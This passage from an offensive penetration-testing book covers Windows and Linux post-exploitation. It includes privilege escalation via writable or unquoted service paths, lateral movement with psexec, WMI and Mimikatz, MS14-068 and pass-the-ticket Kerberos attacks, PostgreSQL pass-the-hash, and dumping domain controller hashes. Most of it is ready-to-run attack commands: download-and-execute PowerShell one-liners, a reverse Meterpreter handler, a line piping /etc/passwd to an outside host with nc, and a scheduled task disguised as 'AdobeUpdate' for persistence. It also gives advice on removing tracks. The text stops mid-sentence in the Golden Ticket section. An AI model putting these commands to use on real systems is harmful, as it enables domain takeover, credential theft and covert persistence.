We see that the service omniserv is vulnerable to the Write-ServiceEXE issue. How can we confirm
that we have the ability to write to C:\Program Files\Fingerprint Manager Pro\OmniServ.exe?
There is a default Windows program called icacls to view file permissions. For example, running
icacls on this file, we would see an output of:
‚óè icacls "C:\Program Files\Fingerprint Manager Pro\OmniServ.exe"
C:\Program Files\Fingerprint Manager Pro\OmniServ.exe
Everyone:(I)(F)
NT AUTHORITY\SYSTEM:(I)(F)
BUILTIN\Administrators:(I)(F)
BUILTIN\Users:(I)(RX)
laptop\testaccount:(I)(F)
APPLICATION PACKAGE AUTHORITY\ALL APPLICATION
PACKAGES:(I)(RX)
For this file, we can see that Everyone has (F) or full access to modify this executable. If we can
replace this service file with another service executable, we can potentially take advantage of systemprivileges.
‚óè powershell -Version 2 -nop -exec bypass IEX (New-Object
Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerToolsWrite-ServiceEXE -ServiceName omniserv -Username newaccount -Password
Asdfasdf1 -Verbose
Vulnerable Service File
If possible, you can try to stop and start the service, but in this case, due to being a limited user, we
need to wait for a reboot to occur. To force a reboot, we can push this command:
‚óè shutdown -r -f -t 0
After a reboot or an administrative account starting and stopping of the service, a new account called
‚Äúnewaccount‚Äù and Password of ‚ÄúAsdfasdf1‚Äù is created with Administrative Privileges. Just log back
in and you are now a local admin.
PowerUp Privilege Escalation
Removing your tracks is always important, so we need to make sure we set everything back to it‚Äôs
original state after we get our admin account. Luckily again, harmj0y created a restore function to put
the original executable back:
‚óè powershell -Version 2 -nop -exec bypass IEX (New-Object
Net.WebClient).DownloadString('https://raw.githubusercontent.com/VeilFramework/PowerTools/master/PowerUp/PowerUp.ps1'); Restore-ServiceEXE -
ServiceName omniserv
‚óã Restoring up 'C:\Program Files\Fingerprint Manager
Pro\OmniServ.exe.bak' to 'C:\Program Files\Fingerprint Manager
Pro\OmniServ.exe'
‚óã Removing backup binary 'C:\Program Files\Fingerprint Manager
Pro\OmniServ.exe.bak'
Option 2:
Metasploit has released a local exploitation module called Windows Service Trusted Path Privilege
Escalation.{15}
The concept of this vulnerability is to look for services that have unquoted paths for files it executes.
In other words, if a service calls an executable like C:\Program Files\Demo File\Demo.exe and it
doesn‚Äôt properly quote the full path name, we can take advantage of this. If we look at the folder name
from our example, \Demo File\, we see that there is a space between Demo and File. In Windows,
this can either be treated as ‚Äú\Demo File\‚Äù or if there happened to be a Demo.exe file in ‚ÄúC:\Program
Files\‚Äù, it would execute the command ‚Äú\Demo.exe File\‚Äù. To visualize this issue, let‚Äôs look at two
strings. The quoted string in the picture below is from the omniserv service from our prior example.
We see that the BINARY_PATH_NAME has quotes around the executable path. However, the
service name DACoreService calls a file that is not quoted. This is where the problem stems from.
Unquoted Vulnerability
In this example, C:\Program Files (x86)\Dragon Assistant\Core\DACore.exe, we could create a file at
C:\Program Files (x86)\Dragon.exe and the service will treat the File Dragon.exe as input to the
executable. To execute a file as a potential system user, we just need to create a service executable in
the path. Let‚Äôs walk through the whole process.
First, we need to identify if we have any Trusted Path Issues. From the Invoke-Allchecks above, we
see that DACoreService is vulnerable to the unquoted service path vulnerability.
‚óè [*] Checking for unquoted service paths...
‚óè [*] Use 'Write-UserAddServiceBinary' to abuse
‚óè [+] Unquoted service path: DACoreService - C:\Program Files (x86)\Dragon
Assistant\Core\DACore.exe
Let‚Äôs take advantage of it. Again, we will call:
‚óè powershell -Version 2 -nop -exec bypass IEX (New-Object
Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerToolsWrite-UserAddServiceBinary -ServiceName DACoreService -Path Dragon.exe
Now, if you have the proper privileges, move Dragon.exe to C:\Program Files (x86)\. When we get a
reboot or when an admin stops and starts the DACoreService service, we will get a new user account
(John) as part of the Administrators Group.
Reboot the host:
‚óè shutdown -r -f -t 0
PowerUp - Account Creation
Zero To Hero - Linux:
On Linux, we run into the same issues. We are looking for files that are world-writable, SUID/GUID
files owned by root, and misconfigurations. Two different tools to look for these privileges are unixprivesc-check and LinEnum.
‚óè https://code.google.com/p/unix-privesc-check/source/checkout
‚óè https://github.com/rebootuser/LinEnum
Move this software over to the victim host and run them.
Lastly, for a good list of Linux/Unix based privilege escalation exploits:
‚óè https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack
With Any Local Administrative or Domain Admin Account:
Hopefully, in the prior chapter, you were able to gain access to a local administrative account that
works on all of the users‚Äô machines or maybe even a domain admin account. What are some of the
next steps for your newly-found credentials? This section is dedicated to continually owning the
network.
Owning The Network With Credentials And Psexec:
In my last book, once you had a username and password, if you wanted to get another Meterpreter
shell on another host, you had to use psexec. The problem was that the default payload would trigger
most AV systems, so we had to create a Meterpreter payload first using Veil and attaching that. Let‚Äôs
go through that first to see what we used to do:
‚óè Go to Veil located in /opt/Veil and execute ./Veil
‚óè list and use payload
‚óè set your LHOST and LPORT
‚óè generate using pyinstaller
‚óè Now go to metasploit, use psexec with the custom payload
‚óã msfconsole
‚óã use exploit/windows/smb/psexec
‚óã set PAYLOAD windows/meterpreter/reverse_https
‚óã set LHOST [IP of My Box]
‚óã set LPORT 443
‚óã set SMBUser TestAccount
‚óã set SMBPass MyPassword
‚óã set SMBDomain fakeDomain
‚óã set EXE::Custom /root/veil-output/compiled/veil_file.exe
‚óã set RHOST [IP of Remote Host]
This worked great in the past and we were able to get around AV. Additionally, I have seen some AV
in the past year start picking up on python executable payloads. As seen throughout the book, this is
definitely is a cat and mouse game. That is what makes penetration testing so much fun.
This is where psexec_psh comes into play. Just like psexec, what psexec_psh does is mimic the
sysinternals tool psexec to log into the victim host and execute a payload. What psexec_psh does
differently is use PowerShell encoded commands to mimic the old psexec. You will get back a
Meterpreter shell, but this time nothing will touch disk at all. No need to create a custom payload to
evade AV.
‚óè use exploit/windows/smb/psexec_psh
‚óè set RHOST 172.16.151.202
‚óè set SMBUser lab
‚óè set SMBPass '!Asdfasdfasdf1!'
‚óè set SMBDomain hacker.testlab
‚óè set LHOST 172.16.151.141
‚óè set PAYLOAD windows/meterpreter/reverse_https
‚óè exploit
psexec_psh
Now moving laterally through the network becomes that much easier and that much more silent.
Once we have a successful Meterpreter session, we will interact with that session with the command:
‚óè sessions -i [session number]
One of the common next steps is to run Mimikatz against the system. If you run into a system that is a
64-bit system, you will have to first migrate into a 64-bit process. The reason I want to utilize a 64-
bit process is because that is the only way Mimikatz will be able to look for the clear text passwords
in 64-bit systems. If it is a 32-bit system, you can still migrate into another process if needed, but it
might not be necessary.
To list all of the processes, we will use the "ps" command. To migrate, we will use the command
"migrate [pid]". In the example below, we identified Notepad running as a 64-bit process and
migrated into it.
‚óè ps
‚óè migrate [pid of a x86_64 process]
You might need to become "system" before doing any of these commands. You can do this by issuing
the following command:
‚óè getsystem
‚óè If you get denied and are a local admin, see the Bypass UAC section.
Once migrated and running as system, we want to load Mimikatz and type the command kerberos (or
you can use wdigest). This should give us the clear text passwords of the current users logged in.
‚óè kerberos
‚óè wdigest
Mimikatz
We now have another account and password to utilize. In addition to Mimikatz, there are also other
post modules in Metasploit that you might want to look into, such as Incognito{16}and
Smart_HashDump{17}. These should get you enough access on this host for the time being.
Psexec Commands Across Multiple IPS (Kali Linux)
Since we have credentials that have local administrative access, there are times where I don't want to
compromise every host, and instead, just run commands on these hosts. For example, some commands
you may want to run on all hosts are:
‚óè net group "Domain Admins" /domain (list all Domain Admins on servers)
‚óè qwinsta (list about user session information)
‚óè Create Additional Administrative Accounts on All Hosts
‚óã net user username password /ADD /DOMAIN
‚óã net group "Domain Admins" username /ADD /DOMAIN
‚óã net localgroup Administrators username /ADD
Royce Davis took the original psexec code and modified it so it does not upload any binaries, but
achieves command line remote code execution in memory. This allows you to avoid AV detection and
run threaded commands on multiple systems. I will show you a quick example:{18}
‚óè use auxiliary/admin/smb/psexec_command
‚óè set RHOSTS [IP or IP Range]
‚óè set SMBDomain [Domain Info]
‚óè set SMBPass [Password]
‚óè set SMBUser [User]
‚óè set COMMAND [command you want to run at the command line]
‚óè exploit
psexec_command
In the Pregame chapter, during the Setting Up Your Box phase, you had the option of enabling logging
for Metasploit. This is one area where logging can be very helpful. If you want to execute code on /24
network or larger, the output is going to be pretty extensive. If you need to parse through it, it is much
easier to have Metasploit log the traffic and grep that file. In the previous command, I was able to run
the qwinsta command on every host and link IPs with usernames. If I have a list of IT administrators, I
can directly attack their box instead of compromising all the hosts on the network.
Move Laterally With WMI (windows)
A better option to move laterally is using WMI or Windows Management Instrumentation. WMI is
used to manage systems and is installed by default on all new Windows operating systems. We can
take advantage of WMI to remotely execute commands on other systems on which we have access.
Since we have compromised our victim and pulled hashes, we can now find an account with elevated
privileges and run commands on remote hosts using those credentials. In the example below, we
compromised a user ‚Äútestuser1‚Äù that has access to another host. We can use WMI to execute Mimikatz
remotely, write it out to a file in the public folder, and read that file:
‚óè wmic /USER:"hacker\testuser1" /PASSWORD:"!Asdfasdfasdf1!"
/NODE:172.16.151.201 process call create "powershell.exe -exec bypass IEX (NewObject
Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploiMimikatz.ps1'); Invoke-Mimikatz -DumpCreds | Out-File C:\\Users\\public\\a.txt"
‚óè dir \\win8\c$\Users\Public\
‚óè type \\win8\c$\Users\Public\a.txt
‚óè del \\win8\c$\Users\Public\a.txt
As you can see from the image below, we are currently on the host win7. We execute a wmic call to
remotely execute a PowerShell script against the host win8 to run Mimikatz and dump it out to a file.
Next, we will read that file from our win7 host.
Remote PowerShell Execution with WMI
This is done all remotely in memory without any executables being run.
So is there a better way to do all this? Harmjoy created a MassMimikatz tool that, for the most part,
does the same thing.{19} Let‚Äôs take a look at this.
MassMimikatz will first start up a web server for the Mimikatz code. This is why we are going to set
a FireWallRule in the switch statement. Next, the script will use WMI to execute PowerShell scripts
on the hosts using the cached credentials on each system, and store the results in a folder called
MimikatzOutput. Let‚Äôs see this in action against a few win7 and win8 systems.
‚óè Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object
Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerToolsMassMimikatz.ps1'); "'win7','win8' | Invoke-MassMimikatz -Verbose -FireWallRule"
MassMimikatz
We don‚Äôt need to worry about password cracking at all, as we will use the speed and efficiency of
MassMimikatz to pull clear text passwords.
Kerberos - MS14-068:
Kerberos had a lot of large vulnerabilities in the past couple of years. One of the biggest
vulnerabilities was MS14-068. This gave any domain user the ability to privilege escalate to domain
administrator. If you don‚Äôt have a great understanding of Kerberos yet, this would be a great time to
get a refresher. If you do have a good understanding of Kerberos, keep moving forward.
As we know, Kerberos is used for authentication and authorization. The underlying issue is that the
Privilege Attribute Certificate (PAC), which stores information such as account name, ID, and group
membership information, can be forged. This means that, with some basic information on a domain
user, you have the ability to move to domain administrator.
‚óè git clone https://github.com/bidord/pykek /opt/pykek/
‚óè apt-get install krb5-user
‚óè apt-get install rdate
‚óè rdate -n [Domain]
‚óè echo 172.16.151.200 dc.hacker.testlab >> /etc/hosts
We are going to need to know four pieces of information:
‚óè -u username@domain [example: limiteduser@hacker.testlab
‚óè -d domain controller [example: dc.hacker.testlab
‚óè -p password
‚óè -s SID [example: S-1-5-21-3525058729-1821581466-2040179600-1111]
We should have all the information except for the SID. To get the sid, just run this command on any
limited user account:
‚óè whoami /user
Retrieving SID information with Whoami
Now that we have all the pieces we need:
‚óè cd /opt/pykek/
‚óè python ms14-068.py -d dc.hacker.testlab -u limiteduser@hacker.testlab -s S-1-5-21-
3525058729-1821581466-2040179600-1111 -p '!Asdfasdfasdf1!'
Creating the ccache Kerberos File
We have a credential cache ticket generated and to use it we copy it to tmp/krb5cc_0:
‚óè cp TGT_limiteduser@hacker.testlab.ccache /tmp/krb5cc_0
You can now access the host using:
‚óè smbclient -k -W hacker.testlab //dc.hacker.testlab/c$ -k
The other option is to push the credential cache ticket and the mimikatz executable to the victim host
and run:
‚óè mimikatz.exe "kerberos::ptc TGT_limiteduser@hacker.testlab.ccache" exit
You are able to do a dir \\dc\c$ and have full access to the victim host.
More info:
‚óè https://github.com/bidord/pykek
‚óè https://community.rapid7.com/community/metasploit/blog/2014/12/25/12-days-ofhaxmas-ms14-068-now-in-metasploit
‚óè https://labs.mwrinfosecurity.com/blog/2014/12/16/digging-into-ms14-068-
exploitation-and-defence/
Pass-The-Ticket
We should all be pretty familiar with Pass-the-Hash attacks from the previous book and this book as
well. With all the Kerberos attacks, it is possible to pass Kerberos tickets as well. Let‚Äôs walk through
an example of stealing Kerberos authentication tickets to impersonate users throughout the network.
{20}
Kerberos Tickets
‚óè privilege :: debug
‚óè sekurlsa::tickets /export
The export command will write all of the Kerberos tickets to the folder from which it was executed.
In the example below, we see the user account ‚Äúlab‚Äù that we recovered. We know from the start that
‚Äúlab‚Äù was a domain administrative account.
Kerberos Tickets
If we look in the same folder, we see a Kerberos krbtgt ticket for the user account lab. We need to
import that as one of our Kerberos tickets. Then, drop back into Mimikatz:
‚óè kerberos::ptt [0;ab9bf]-2-1-40e10000-lab@krbtgt-HACKER.TESTLAB.kirbi
Kerberos - Pass-the-Ticket
Once we drop out of Mimikatz, we can do a directory listing on the domain controller and get a
listing. We now have a Kerberos ticket as a domain administrative account.
Lateral Movement With Postgres SQL
I love lateral movement as it takes creativity and an understanding of how exactly technologies work.
On versions of PostgreSQL v9.5 and earlier (remember that most orgs that I found do not regularly
patch PostgreSQL), lies a vulnerability that allows a pass-the-hash authentication. This was
originally found by Jens Steube and Phillipp Schmidt and allows an attacker to authenticate to
PostgreSQL databases that utilize ChallengeResponse Authentication using the AUTH_REQ_MD5
method or simply configuring "md5" as the Host Based Authentication (HBA) in pg_hba.conf.{21}
Here is their amazing paper on how they discovered that during the authentication process, the actual
password is not checked, but instead has the hash:
https://hashcat.net/misc/postgres-pth/postgres-pth.pdf.
Let‚Äôs say you are on an internal penetration test, and you used SQLMap or a similar tool to identify an
SQL injection on a web page that utilizes a postgreSQL backend. It might look something like:
‚óè http://postgres.suck.testlab/search.php?search=weapons'union select
null,concat(usename,passwd) FROM pg_shadow--
‚óè http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet
The result will be a list of hashes of all the users:
‚óè postgres,md532e12f215ba27cb750c9e093ce4b5127
‚óè secretloginmd598d21549d6420160b54f7898a7ff60cc
‚óè john,md5cbfaf1e32c711ee7ba63b5b65f8a777b
‚óè test,md505a671c66aefea124cc08b76ea6d30bb
We could spend time dropping it in oclhashcat and trying to crack the passwords, but due to the PTH
issues, we can actually connect to all the other postgresql servers with just the hash. Let‚Äôs walk
through how this is done. We are going to pull a copy of postgresql onto our box, download the patch,
apply the patch, and configure and install our modified version of psql. Psql is just an interactive
terminal to connect to postgres. With our modified version, we can now supply hashes instead of
passwords.
I tested this with Postgres Commit: a2e35b53c39b2a27d3e332dc7c506539c306fd44
‚óè mkdir /opt/postgresql/ && wget
https://github.com/postgres/postgres/archive/a2e35b53c39b2a27d3e332dc7c506539c30&& unzip a2e35b53c39b2a27d3e332dc7c506539c306fd44.zip -d /opt/ && mv
/opt/postgres-a2e35b53c39b2a27d3e332dc7c506539c306fd44 /opt/postgresql/ &&
cd /opt/postgresql/
‚óè wget https://hashcat.net/misc/postgres-pth/postgresql_diff_clean.txt
‚óè git apply postgresql_diff_clean.txt
‚óè ./configure
‚óè make && make install
‚óè cd /usr/local/pgsql/bin/
‚óè ./psql -h [IP of PostgreSQL server] -U postgres
‚óè Supply hash of the postgres user
But why stop there? To show you what you can do once you are logged in as the privileged Postgres
user, we will read the /etc/passwd file.
‚óè CREATE TABLE mydata(t text);
‚óè COPY mydata FROM '/etc/passwd';
‚óè SELECT t FROM mydata LIMIT 5 OFFSET 1;
Pass-the-Hash with PostgreSQL
We can also run command shells to fully compromise the host.
‚óè CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS
'/lib/libc.so.6', 'system' LANGUAGE 'C' STRICT; ‚Äî privSELECT system('cat
/etc/passwd | nc 10.0.0.1 8080‚Ä≤);
‚óè http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet
If you want to run this exercise in a controlled environment, the version installed on Kali Linux
(before any updates) should be vulnerable as long as it is older than v9.5. If it is not, you will have to
uninstall PostgreSQL before installing the vulnerable version. Once installed, create a new user (in
this case ‚Äúthp‚Äù), create a database, and print out the hash:
‚óè sudo -u postgres psql
‚óè create user thp createdb createuser password 'thp';
‚óè create database thp owner thp;
‚óè select (usename,passwd) FROM pg_shadow;
‚óè Grab the created hash password for the ‚Äúthp‚Äù user
‚óè Run the example above, but instead of the user ‚Äúpostgres‚Äù use ‚Äúthp‚Äù
Pulling Cached Credentials
Did you ever try to log onto your laptop while you weren‚Äôt on the network? How can you authenticate
without being connected to the domain? It is because Windows stores the last ten users with
successful logins by default. If we can dump this, this is another way to find additional credentials.
We won‚Äôt be able to pull these passwords in clear text, so we will have to try to crack these
credentials.
What types of users might you see? Of course the user of the laptop, but you will usually also find an
account like ‚Äúhelpdesk‚Äù or similar, as they originally set up the machine. In the next example, we will
assume you already have a Meterpreter shell on our victim host and we will use Metasploit‚Äôs
cachedump module to pull these creds.
Within Metasploit, we will can use cachedump (with Local Admin privileges):
‚óè use post/windows/gather/cachedump
‚óè set SESSIONS 1
‚óè show options
‚óè exploit
[*] Executing module against win7
[*] Cached Credentials Setting: - (Max is 50 and 0 disables, and 10 is default)
[*] Obtaining boot key...
[*] Obtaining Lsa key...
[*] Vista or above system
[*] Obtaining LK$KM...
[*] Dumping cached credentials...
[*] Hash are in MSCACHE_VISTA format. (mscash2)
[*] MSCACHE v2 saved in:
/root/.msf4/loot/20150128134030_default_192.168.199.1_mscache2.creds_209900.txt
[*] John the Ripper format:
# mscash2
domain_admin:$hacker$#domain_admin#06198c06198c06198c06198c06198c9:HACKER.TESTLABTo Crack in oclHashCat:
If it is in a file, the proper format is:
$DCC2$10240#account_name#hash
Although using faster GPUs helps, the major problem with cached credentials is that it is very very
slow to crack. Attacking cached credentials is usually an approach that you might take if you can‚Äôt
move laterally or need to crack in the background while you continue to attack. Let‚Äôs look at the
oclHashcat command:
‚óè oclHashcat64.exe -m 2100 hashes\mscash2.txt lists\crackstat_realhuman_phill.txt
oclHashcat - mscash2
We can decide to add a rule to cracking our mscash2 hash with the command:
‚óè oclHashcat64.exe -m 2100 hashes\mscash2.txt lists\crackstat_realhuman_phill.txt -r
rules\InsidePro-HashManager.rule --force
We are now looking at about 20 days to crack this hash. Although mscash2 hashes are extremely
valuable, the amount of time it takes to crack might not be feasible on a one-week penetration test.
This could be used for more long-term attacks.
Attacking The Domain Controller:
If you were lucky enough to get a local administrative account or a domain admin account, the next
target is usually the Domain Controller (DC). One of the happiest moments for any pentester is when
they successfully pull all the hashes out of the DC.
Even with administrative credentials, we don't have access to read the hashes on the Domain
Controller that are stored in the c:\Windows\NTDS\ntds.dit file. This is because that file is readlocked as Active Directory constantly accesses it. The solution to this problem is to use the Shadow
Copy functionality natively in Windows to create a copy of that file.{22}
SMBExec
(https://github.com/brav0hax/smbexec) (Kali Linux)
This is where a tool called SMBExec comes into play. SMBExec, a tool made by brav0hax, grabs the
SYS reg keys and ntds.dit file using the Shadow Copy functionality. Let's take a look at the SMBExec
module that we installed in the Setting Up Your Box section.
‚óè Running SMBExec
‚óã cd /opt/smbexec
‚óã ./smbexec
‚óè Select 3 for Obtain Hashes
‚óè Select 2 for Domain Controllers
‚óè Provide username/hash/domain/IP/NTDS Drive/NTDS Path
SMBExec - Volume Shadow Copy
We just saw that SMBExec connected to the Domain Controller with valid credentials, validated
paths, and attempted to create a Shadow Copy of the ntds.dit and sys files. Once this was completed,
SMBExec tried to parse through those files and collect and store all the password hashes from LDAP.
Once SMBExec finishes and is successful, it creates a folder in the same directory based on a datetime stamp. If you go into this folder you will see a file called [domain]-dc-hashes.lst.
SMBExec Results
Inside the example compromised domain controller, I am able to find the NTLM hashes for the
following users:
Administrator: 500:
aad3b435b51404eeaad3b435b51404ee:8b9e471f83d355eda6bf63524b044870:::
Guest: 501: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
admin_account:1000:
aad3b435b51404eeaad3b435b51404ee:954bf28f34e47904f5c8725650f27283::
krbtgt: 502: aad3b435b51404eeaad3b435b51404ee:876c4efd01dbf8da6cd04c60ddac0f95:::
bobsmith: 1105: aad3b435b51404eeaad3b435b51404ee:8faf590241a5d5ed59fb80eb00440589:::
domainadmin: 1106:
aad3b435b51404eeaad3b435b51404ee:8faf590241a5d5ed59fb80eb00440589:::
pmartian: 1107: aad3b435b51404eeaad3b435b51404ee:8faf590241a5d5ed59fb80eb00440589:::
Remember that if you are querying a large domain controller, go grab a coffee, as this will take a
considerable amount of time. After you collect all these hashes, you can start password cracking or
utilize the passing of hashes to continually exploit boxes.
PSExec_NTDSgrab
(http://www.rapid7.com/db/modules/auxiliary/admin/smb/psexec_ntdsgrab) (Kali Linux):
Another great way to dump hashes is with a metasploit module called psexec_ntdsgrab. Similar to
SMBExec, PSExec_NTDSGrab ‚Äúauthenticates to an Active Directory Domain Controller and creates
a volume shadow copy of the %SYSTEMDRIVE%. It then pulls down copies of the ntds.dit file as
well as the SYSTEM hive and stores them. The ntds.dit and SYSTEM hive copy can be used in
combination with other tools for offline extraction of AD password hashes. All of this is done without
uploading a single binary to the target host.‚Äù{23}
With local/domain administrator credentials, let‚Äôs grab the domain hashes:
‚óè msfconsole
‚óè use auxiliary/admin/smb/psexec_ntdsgrab
‚óè Make sure to SET the fields for RHOST, SMBDomain, SMBPass, and SMBUser
‚óè exploit
Using psexec_ntdsgrab
If grabbing the NTDS.dit file was successful, Metasploit will drop the file to the /root/.ms4/loot/
folder. Next, we will need to convert the dit file to hashes with esedbtool and NTDSextract.
esedbexport command:
‚óè How to run: esedbexport -t [Location of Export] [NTDS.dit file]
‚óè /opt/esedbtools/esedbexport -t /tmp/ntds
/root/.msf4/loot/20150214180250_default_172.16.151.200_psexec.ntdsgrab._641158.d
Converting NTDS.dit
Next we need to run dshashes.py to convert our tables to password hashes. How to run:
‚óè dshashes.py [datatable table] [link_table] --passwordhashes [original bin file fromntdsgrab]
‚óè python /opt/NTDSXtract/dshashes.py /tmp/ntds.export/datatable.4
/tmp/ntds.export/link_table.7 /tmp/ --passwordhashes
/root/.msf4/loot/20150214180253_default_172.16.151.200_psexec.ntdsgrab._127578.bExtracting Hashes
This is just another way to dump domain hashes. In various tests, I have had either SMBExec or
psexec_ntdsgrab not work for some odd reason. In other words, there were times when one tool
worked while the other tool did not. Therefore, make sure you have both of these tools in your back
pocket.
Persistence
One thing that I skipped in the last book is different ways to create persistence. I have found that there
are tons of different ways to accomplish this (even the cheap method of dropping the binary in
startup), but here are a few of my tricks.
Veil And Powershell
Veil has been great for evading AV, but it can also create PowerShell Meterpreter executables. I
really prefer having PowerShell files over actual binaries, just because you never know what AV
might pick up on. Let‚Äôs use Veil to create a quick payload.
‚óè cd /opt/Veil-Evasion/
‚óè ./Veil-Evasion
First list off all of the available payloads by using the command list:
Available commands:
use use a specific payload
info information on a specific payload
list list available payloads
update update Veil to the latest version
clean clean out payload folders
checkvt check payload hashes vs. VirusTotal
exit exit Veil
[>] Please enter a command: list
Since we want to use Meterpreter Reverse HTTPS, we can pick the following:
17) powershell/meterpreter/rev_https
We need to define all the parameters, so that the Meterpreter session can connect back to our host. Set
the following information:
For example, my Kali Linux host is 172.16.151.140. To set the Local Host:
[>] set LHOST 172.16.151.140
[>] Please enter a command: generate
[>] Please enter the base name for output files: reverse_https
And your output might look something like the following:
Veil-Framework
Take a look at the two files created. The reverse_https.bat file will contain what looks like to be the
following:
PowerShell Encoded Meterpreter
This is a PowerShell compressed bat file that will detect processor architecture and implement the
proper PowerShell payload to connect back to your listener.
The second file is a resource file, as we have seen before, that will automatically set up our handler
to accept the PowerShell payloads. Kick off the resource file with ‚Äúmsfconsole -r /root/veiloutput/handlers/reverse_https_handler.rc‚Äù.
[*] Processing /root/veil-output/handlers/reverse_https_handler.rc for ERB directives.
resource
(/root/veil-output/handlers/reverse_https_handler.rc)
> use exploit/multi/handler
resource
(/root/veil-output/handlers/reverse_https_handler.rc)
> set PAYLOAD windows/meterpreter/reverse_https
resource
(/root/veil-output/handlers/reverse_https_handler.rc)
> set LHOST 172.16.151.140
resource
(/root/veil-output/handlers/reverse_https_handler.rc)
> set LPORT 8443
resource
(/root/veil-output/handlers/reverse_https_handler.rc)
> set ExitOnSession false
resource
(/root/veil-output/handlers/reverse_https_handler.rc)
> exploit ‚Äìj
[*] Exploit running as background job.
[*] Started HTTPS reverse handler on https://0.0.0.0:8443/
[*] Starting the payload handler...
msf exploit(handler) >
Now you can do a few things here. You can drop that bat file into the startup folder, configure a
scheduled task to run that PowerShell script, or execute the PowerShell from a command line.
To run it from a command shell, you need to remove the backslashes (two of them), change the inside
quotes to ticks, and remove the ending parenthesis. For example, from the reverse_https.bat, we
stripped out just what we need to execute the Meterpreter (and cleaned up the backslashes, inside
quotes, and end parenthesis). The benefit of this is that you don‚Äôt need to download any PowerShell
script. The whole payload is compressed in the command below (for 64bit systems):
%WinDir%\syswow64\windowspowershell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec
Bypass -Command "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object
IO.Compression.DeflateStream ($(New-Object IO.MemoryStream
(,$([Convert]::FromBase64String(‚ÄònVRtb9pIEP7OrxhZe5KtYMe8NE2wIpWSps1doTSk...pKRtsdc50r[IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();"
We can also drop the reverse_https.bat onto the host, put it in the startup folder, and on a successful
reboot get a full Meterpreter session back to our host:
msf exploit(handler) >
[*] 172.16.151.202:49850 Request received for /3gZh...
[*] 172.16.151.202:49850 Staging connection for target /3gZh received...
[*] Meterpreter session 2 opened (172.16.151.140:8443 -> 172.16.151.202:49850) at 2015-01-13
03:02:18 -0500
Persistence With Schedule Tasks
We are going to reuse the PowerSploit invoke-shellcode to keep persistence on the host system.
Because we have limited space in the schtask function and we may want our reverse_https
Meterpreter sessions to change destination hosts, we are going to modify the invoke-shellcode
PowerShell script and repost it. Once re-posted, we will configure a schtask to run once a day and
connect back to our Meterpreter handler. {24}
First we need to grab a copy of invoke-shellcode and modify it. We will use our Kali host machine to
modify the invoke-shellcode script.
‚óè cd /opt/PowerSploit/CodeExecution
As we said before, we are limited in space, so we are going to copy the original file to a shortened
file:
‚óè cp Invoke-Shellcode.ps1 1.ps1
Next, let‚Äôs go ahead and edit 1.ps1 script and add our reverse shell information at the bottom of this
ps1 file. To do this, add the following line while filling in the Listener IP and Port:
‚óè Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost
[LISTENER_IP] -Lport [LISTENER_PORT] -Force;
For example, my Metasploit handler is on 192.168.199.128 and listening on port 8443. I add this to
the last line:
‚óè Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost
192.168.199.128 -Lport 8443 -Force;
Modifying Invoke-Shellcode
We now have our shortened invoke-shellcode script and can move this file off to a web server. In this
example, we can just move it to /var/www and start the apache web server:
‚óè cp 1.ps1 /var/www/
‚óè service apache2 start
Validate this by going to http://[YourIP]/1.ps1
Generally, I would host this file on a URL shortened site, but for this example, we are just hosting it
locally. Everything is set up to add persistence to our victim host. All we need is a shell and the
following command:
‚óè schtasks /create /tn AdobeUpdate /tr
"c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -NoLogo -
WindowStyle hidden -NonInteractive -ep bypass -nop -c 'IEX ((new-object
net.webclient).downloadstring(''http://[YourIP]/1.ps1'''))'" /SC DAILY /ST 12:00:00
This creates a schtask named AdobeUpdate that runs at noon everyday to download your modified
PowerShell script and execute it. Two additional options are:
‚óè If you have system privileges, you can run the script under system. Just add the
following switch to the above command:
‚óã /ru System
‚óè If you are attacking a 32bit Windows system, change the PowerShell location in
your schtask to:
‚óã c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe
Golden Ticket
Kerberos is something extremely important to understand. Since explaining exactly how Kerberos and
Kerberos Tickets work is pretty complicated, I will direct you to a SANS blog article that covers this
topic well.
Full Link:
http://digital-forensics.sans.org/blog/2014/11/24/kerberos-in-the-crosshairs-golden-tickets-silvertickets-mitm-more
Bit.ly Link:
http://bit.ly/1DK0kaS
In short, Kerberos is used as an authentication and authorization platform, which uses tickets. What if
you could create you own tickets to authenticate to any server? That is exactly what the Golden Ticket
could do. On the topic of persistence, let‚Äôs say you have compromised a Domain Controller in the
past and dumped all the hashes. Your client tells you a week later that they fixed all the
vulnerabilities that you identified to get Domain Admin and changed all the passwords. They hire you
again to see what you can do. You do the normal social engineering to get your initial shell, but now
you are only a limited user. All the initial entry points are now blocked and they have limited
scanning detection/prevention.
With the Golden Ticket, you don‚Äôt have to worry about anything. You can take the old krbtgt hash
from the previous hash dump and promote yourself back to a Domain Admin. Best of all, you can do
all this with an unprivileged account. A few things you need to know about the krbtgt:
‚óè It is not recommended to reset the system generated password. It could break the
whole domain. Therefore, it is generally never changed. (Although Microsoft recently
released a tool to handle resetting the krbtgt account).
‚óè Even if you change every password for every domain admin, you can still become a
DA.
‚óè The only time I have seen the system generated password changed is from a function
2003 to 2008 upgrade.
‚óè You can create Users and Groups that don‚Äôt exist with the Golden Ticket.
So what do you need to perform the Golden Ticket attack?{25}{26}{27}
‚óè 1) Domain
‚óã On a victim host type: whoami
‚óè 2) Domain Admin User
‚óã On a victim host type: net localgroup administrators /DOMAIN
‚óè 3) Domain SID
‚óã On a victim host type: whoami /user
‚óã Chop off the last dash and four digits
‚óè 4) Krbtgt
‚óã From a previous hashdump, you just need the second half of the hash
(just the NTLM hash)
Information Needed to Create Golden Ticket
As seen in prior examples, to get the krbtgt hash, we first had to dump all the domain hashes. This can
